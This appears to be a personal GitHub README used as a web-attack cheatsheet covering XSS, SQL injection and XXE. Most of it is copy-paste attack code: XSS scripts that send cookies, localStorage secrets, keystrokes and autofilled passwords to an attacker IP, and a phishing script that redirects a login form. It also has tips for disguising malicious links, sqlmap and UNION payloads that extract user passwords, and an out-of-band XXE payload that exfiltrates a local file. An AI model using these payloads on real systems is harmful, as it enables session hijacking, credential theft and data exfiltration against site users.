# Welcome to Useful-Shit/Web!

Hi! This would probably be better as a gist, honestly. But it's my repo and I'll do what I want!
This is basically just a web testing cheatsheet for me but if you find my stuff useful, a star would be appreciated 😁

## Quick Jump:
- [XSS](#xss-copypastas)
- [SQLi](#sql-injection-sqli)
- []

# Cross-Site Scripting (XSS)

XSS Payloads for fun and profit. Different types of XSS:

 - **Reflected Server XSS:** often found in locations where user input is sent via GET parameters.
	 - `search.php?s=%3Cscript%3Ealert%280%29%3C%2Fscript%3E`
 - **Stored Server XSS:** Literally stored on the server. Think user comments or blog/page posts.
	 - `<script>alert(0)</script>`
 - **Reflected Client XSS:** Same kind of idea as the Server XSS. Stuff some junk into a parameter and see what sticks.
	 - `<img src='x' onerror='alert(1)'>`
 - **Stored Client XSS:** Things like form elements can be taken advantage of to store XSS, for example a survey page for Jarrod has the URL `http://survey.tld/?name=Jarrod` and after filling the survey we end up with a new parameter `http://survey.tld/?name=Jarrod&result`. The answers to the survey could be prone to injection, and should be tested.

## XSS - Exploitation

### Stealing session cookies

Leverage XSS to fetch the payload from a web server you control:

`xss.js`

```javascript
let cookie = document.cookie

let encodedCookie = encodeURIComponent(cookie)

fetch("http://192.168.49.51/exfil?data=" + encodedCookie)
```

This payload may not work if `HttpOnly` is specified in the server headers.

### Stealing local secrets

Local storage may include secrets like API keys or personal user info. There are two types: `sessionStorage` and `localStorage` - session storage only holds data for the session, whereas `localStorage` is the local cache and won't be flushed until explicitly done so.

`local.js`

```javascript
let data = JSON.stringify(localStorage)

let encodedData = encodeURIComponent(data)

fetch("http://192.168.49.51/exfil?data=" + encodedData)
```

### Keylogging

It's keylogging, but through XSS. Let's see what users are typing:

`klog.js`

```javascript
function logKey(event){
        fetch("http://192.168.49.51/k?key=" + event.key)
}

document.addEventListener('keydown', logKey);
```

### Stealing saved passwords

`stealer.js`

```javascript
let body = document.getElementsByTagName("body")[0]

  var u = document.createElement("input");
  u.type = "text";
  u.style.position = "fixed";
  //u.style.opacity = "0";

  var p = document.createElement("input");
  p.type = "password";
  p.style.position = "fixed";
  //p.style.opacity = "0";

  body.append(u)
  body.append(p)

  setTimeout(function(){ 
          fetch("http://192.168.49.51/k?u=" + u.value + "&p=" + p.value)
   }, 5000);
```

### Phishing users

The concept is simple: Use javascript to *fetch* the login page, and change the action (submit) on the form to point to our listening server hosting the XSS. Take the above **Reflected Server XSS** for example. In the `search.php?s=` parameter, we could use `<script src="10.10.13.37/xss.js"></script>`, but URLEncode it first: `search.php?s=%3Cscript%20src%3D%2210%2E10%2E13%2E37%2Fxss%2Ejs%22%3E%3C%2Fscript%3E`. Now we have a deadly link to send to users, or take it a step further and use a URL shortener 😉

`phish.js`

```javascript
fetch("login").then(res => res.text().then(data => {
	document.getElementsByTagName("html")[0].innerHTML = data
	document.getElementsByTagName("form")[0].action = "http://192.168.49.51"
	document.getElementsByTagName("form")[0].method = "get"
}))
```

## XSS Copypastas

 - `<script>alert(0)</script>`

 - `<img src='x' onerror='alert(1)'>`

 - `<img src='x' onerror='alert(document.location)'>`

 - External payload: `<script src="http://10.10.13.37/xss.js"></script>`

 - Insert script from external: `<img src='x' onerror='const script = document.createElement("script"); script.src="http://10.10.13.37/xss-login.js";document.head.append(script);'>`


## SQL Injection (SQLi)

### Fuzzing GET parameter
`wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -u "$URL/index.php?id=FUZZ"`

### Fuzzing POST parameter
`wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -d "id=FUZZ" -u "$URL/index.php"`

### sqlmap GET parameter
`sqlmap -u "$URL/index.php?id=1"`

### sqlmap POST parameter

Copy POST request from Burp Suite into `post.req` file

`sqlmap -r post.req -p parameter`

SELECT * FROM menu WHERE name = 'Tostadas'

SELECT id, name, description, price FROM menu WHERE name = 'foo'

jim OR id between 1 and 200

Postgresql: '; select * from menu;--

Oracle:

Strings and functions

ALL: %foo') or id between 1 and 200-- %')

## Example SQLi Statements:

MSSQL error discovery: `inStock=1&name=test&sort=id&order=%foo') or id between 1 and 200-- %')`

MSSQL version/error-based: `inStock=1&name=test ') or 1/@@version=LOWER('name&sort=id&order=asc`

MSSQL 2: `inStock=CAST((SELECT+TOP+1+table_name+FROM+(Select+TOP+2+table_name+FROM+app.information_schema.tables+ORDER+BY+table_name)z+ORDER+BY+table_name+DESC)+as+varchar);&name=&sort=id&order=asc`

UNION: `SELECT id, name, description, price FROM menu WHERE id = 0 UNION ALL SELECT id, username, password, 0 from users`

## External XML Entities (XXE)

Fetch `external.dtd`

```xml
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE oob [
<!ENTITY % base SYSTEM "http://192.168.45.222/external.dtd"> 
%base;
%external;
%exfil;
]>
<entity-engine-xml>
</entity-engine-xml>
```

`external.dtd`
```
<!ENTITY % content SYSTEM "file:///root/oob.txt">
<!ENTITY % external "<!ENTITY &#37; exfil SYSTEM 'http://192.168.45.222/out?%content;'>" >
```